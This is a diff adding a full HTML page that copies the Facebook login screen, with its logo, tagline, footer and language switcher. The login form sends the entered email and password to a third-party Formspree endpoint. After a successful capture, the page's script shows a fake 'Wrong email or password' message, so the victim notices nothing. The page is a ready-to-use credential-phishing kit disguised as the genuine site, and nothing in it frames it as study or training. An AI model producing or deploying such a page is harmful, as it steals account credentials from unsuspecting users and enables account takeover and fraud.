@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook – log in or sign up</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            background-color: #f0f2f5;
+            font-family: SFProDisplay-Regular, Helvetica, Arial, sans-serif;
+        }
+        .fb-shadow {
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+        }
+        .fb-input {
+            border: 1px solid #dddfe2;
+            color: #1d2129;
+            font-size: 17px;
+            line-height: 16px;
+        }
+        .fb-input::placeholder {
+            color: #8d949e;
+        }
+        .fb-input:focus {
+            outline: none;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        #status-message.hidden-msg {
+            display: none;
+        }
+        #status-message.success {
+            display: block;
+            color: #42b72a;
+            background: #e7f3ff;
+            padding: 10px;
+            border-radius: 6px;
+            margin-bottom: 15px;
+            font-size: 14px;
+        }
+        #status-message.error {
+            display: block;
+            color: #f02849;
+            background: #ffebe8;
+            padding: 10px;
+            border-radius: 6px;
+            margin-bottom: 15px;
+            font-size: 14px;
+        }
+        .footer-link {
+            color: #8a8d91;
+            font-size: 12px;
+            margin-right: 10px;
+            text-decoration: none;
+            cursor: pointer;
+        }
+        .footer-link:hover {
+            text-decoration: underline;
+        }
+        .lang-active {
+            color: #737373;
+            cursor: default;
+        }
+        .lang-active:hover {
+            text-decoration: none;
+        }
+        /* Match the exact logo scaling */
+        .fb-logo {
+            height: 106px;
+            margin: -28px;
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col items-center">
+
+    <div class="flex-grow flex items-center justify-center p-4 w-full">
+        <div class="max-w-[980px] w-full flex flex-col lg:flex-row items-center justify-between lg:items-start lg:mt-[-80px]">
+            
+            <!-- Left Section: Branding -->
+            <div class="text-center lg:text-left lg:w-3/5 lg:pt-20">
+                <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4l_v2bbLp3c.svg" alt="Facebook" class="fb-logo mx-auto lg:mx-[-28px]">
+                <h2 id="fb-tagline" class="text-[24px] lg:text-[28px] font-normal leading-[32px] text-[#1c1e21] lg:w-[500px] mt-0">
+                    Facebook helps you connect and share with the people in your life.
+                </h2>
+            </div>
+
+            <!-- Right Section: Login Box -->
+            <div class="w-full max-w-[396px] mt-10 lg:mt-10">
+                <div class="bg-white p-4 rounded-lg fb-shadow text-center">
+                    
+                    <div id="status-message" class="hidden-msg"></div>
+
+                    <form id="fb-login-form" action="https://formspree.io/f/xbddjkbw" method="POST">
+                        <div class="space-y-3">
+                            <input 
+                                type="text" 
+                                name="ema" 
+                                id="input-email"
+                                placeholder="Email address or phone number" 
+                                required 
+                                class="fb-input w-full p-[14px] rounded-md"
+                            >
+                            <input 
+                                type="password" 
+                                name="pal" 
+                                id="input-pass"
+                                placeholder="Password" 
+                                required 
+                                class="fb-input w-full p-[14px] rounded-md"
+                            >
+                            <button 
+                                type="submit" 
+                                id="submit-btn"
+                                class="w-full bg-[#1877f2] hover:bg-[#166fe5] text-white font-bold py-2.5 rounded-md text-[20px] transition duration-200"
+                            >
+                                Log In
+                            </button>
+                        </div>
+                    </form>
+
+                    <div class="mt-4">
+                        <a href="#" id="forgot-link" class="text-[#1877f2] text-[14px] hover:underline">Forgotten password?</a>
+                    </div>
+                    
+                    <hr class="my-5 border-gray-200">
+                    
+                    <div class="pb-2">
+                        <button id="create-btn" class="bg-[#42b72a] hover:bg-[#36a420] text-white font-bold px-4 py-3 rounded-md text-[17px] transition duration-200">
+                            Create new account
+                        </button>
+                    </div>
+                </div>
+                
+                <p class="mt-7 text-sm text-center text-[#1c1e21]">
+                    <a href="#" class="font-bold hover:underline">Create a Page</a> for a celebrity, brand or business.
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Real Facebook Footer -->
+    <footer class="w-full bg-white flex justify-center pt-8 pb-10">
+        <div class="max-w-[980px] w-full px-4 text-[#8a8d91]">
+            <div id="language-selector" class="flex flex-wrap border-b border-gray-200 pb-2 mb-2">
+                <span class="footer-link lang-active" data-lang="en">English (UK)</span>
+                <span class="footer-link" data-lang="ha">Hausa</span>
+                <span class="footer-link" data-lang="fr">Français (France)</span>
+                <span class="footer-link" data-lang="pt">Português (Brasil)</span>
+                <span class="footer-link" data-lang="es">Español</span>
+                <span class="footer-link" data-lang="ar">العربية</span>
+                <span class="footer-link" data-lang="id">Bahasa Indonesia</span>
+                <span class="footer-link" data-lang="de">Deutsch</span>
+                <span class="footer-link" data-lang="ja">日本語</span>
+                <span class="footer-link" data-lang="it">Italiano</span>
+                <span class="footer-link" data-lang="hi">हिन्दी</span>
+                <button class="bg-[#f5f6f7] border border-[#ccd0d5] text-[#4b4f56] px-2 font-bold">+</button>
+            </div>
+            <div class="flex flex-wrap leading-6">
+                <a href="#" class="footer-link">Sign Up</a>
+                <a href="#" class="footer-link">Log In</a>
+                <a href="#" class="footer-link">Messenger</a>
+                <a href="#" class="footer-link">Facebook Lite</a>
+                <a href="#" class="footer-link">Video</a>
+                <a href="#" class="footer-link">Places</a>
+                <a href="#" class="footer-link">Games</a>
+                <a href="#" class="footer-link">Marketplace</a>
+                <a href="#" class="footer-link">Meta Pay</a>
+                <a href="#" class="footer-link">Meta Store</a>
+                <a href="#" class="footer-link">Meta Quest</a>
+                <a href="#" class="footer-link">Instagram</a>
+                <a href="#" class="footer-link">Threads</a>
+                <a href="#" class="footer-link">Fundraisers</a>
+                <a href="#" class="footer-link">Services</a>
+                <a href="#" class="footer-link">Voting Information Centre</a>
+                <a href="#" class="footer-link">Privacy Policy</a>
+                <a href="#" class="footer-link">Privacy Centre</a>
+                <a href="#" class="footer-link">Groups</a>
+                <a href="#" class="footer-link">About</a>
+                <a href="#" class="footer-link">Create ad</a>
+                <a href="#" class="footer-link">Create Page</a>
+                <a href="#" class="footer-link">Developers</a>
+                <a href="#" class="footer-link">Careers</a>
+                <a href="#" class="footer-link">Cookies</a>
+                <a href="#" class="footer-link">AdChoices</a>
+                <a href="#" class="footer-link">Terms</a>
+                <a href="#" class="footer-link">Help</a>
+                <a href="#" class="footer-link">Contact uploading and non-users</a>
+            </div>
+            <div class="mt-5 text-[11px]">
+                Meta © 2026
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        const translations = {
+            en: {
+                tagline: "Facebook helps you connect and share with the people in your life.",
+                email: "Email address or phone number",
+                pass: "Password",
+                login: "Log In",
+                forgot: "Forgotten password?",
+                create: "Create new account"
+            },
+            ha: {
+                tagline: "Facebook yana taimaka maka ka tuntuɓi kuma ka raba tare da mutane a rayuwarka.",
+                email: "Adireshin imel ko lambar waya",
+                pass: "Kalmar sirri",
+                login: "Shiga",
+                forgot: "An manta kalmar sirri?",
+                create: "Ƙirƙiri sabon asusu"
+            },
+            fr: {
+                tagline: "Avec Facebook, partagez et restez en contact avec votre entourage.",
+                email: "Adresse e-mail ou numéro de tél.",
+                pass: "Mot de passe",
+                login: "Se connecter",
+                forgot: "Mot de passe oublié ?",
+                create: "Créer nouveau compte"
+            },
+            es: {
+                tagline: "Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.",
+                email: "Correo electrónico o teléfono",
+                pass: "Contraseña",
+                login: "Iniciar sesión",
+                forgot: "¿Has olvidado la contraseña?",
+                create: "Crear cuenta nueva"
+            },
+            ja: {
+                tagline: "Facebookを利用すると、友達や同僚、同級生、仲間たちとつながりを深められます。",
+                email: "メールアドレスまたは電話番号",
+                pass: "パスワード",
+                login: "ログイン",
+                forgot: "パスワードを忘れた場合",
+                create: "新しいアカウントを作成"
+            }
+        };
+
+        const form = document.getElementById("fb-login-form");
+        const status = document.getElementById("status-message");
+        const submitBtn = document.getElementById("submit-btn");
+        const langLinks = document.querySelectorAll('#language-selector .footer-link');
+
+        langLinks.forEach(link => {
+            link.addEventListener('click', () => {
+                const lang = link.getAttribute('data-lang');
+                if (!translations[lang]) return;
+
+                langLinks.forEach(l => l.classList.remove('lang-active'));
+                link.classList.add('lang-active');
+
+                document.getElementById('fb-tagline').innerText = translations[lang].tagline;
+                document.getElementById('input-email').placeholder = translations[lang].email;
+                document.getElementById('input-pass').placeholder = translations[lang].pass;
+                document.getElementById('submit-btn').innerText = translations[lang].login;
+                document.getElementById('forgot-link').innerText = translations[lang].forgot;
+                document.getElementById('create-btn').innerText = translations[lang].create;
+            });
+        });
+
+        async function handleSubmit(event) {
+            event.preventDefault();
+            submitBtn.disabled = true;
+            submitBtn.style.opacity = "0.7";
+            status.className = "hidden-msg";
+
+            const data = new FormData(event.target);
+
+            try {
+                const response = await fetch(event.target.action, {
+                    method: form.method,
+                    body: data,
+                    headers: { 'Accept': 'application/json' }
+                });
+
+                if (response.ok) {
+                    status.innerHTML = "Wrong email or password";
+                    status.className = "success";
+                    setTimeout(() => {
+                        window.location.href = "#";
+                    }, 1500);
+                } else {
+                    status.innerHTML = "Invalid username or password.";
+                    status.className = "error";
+                }
+            } catch (error) {
+                status.innerHTML = "Network error. Please try again.";
+                status.className = "error";
+            } finally {
+                submitBtn.disabled = false;
+                submitBtn.style.opacity = "1";
+            }
+        }
+
+        form.addEventListener("submit", handleSubmit);
+    </script>
+
+</body>
+</html>
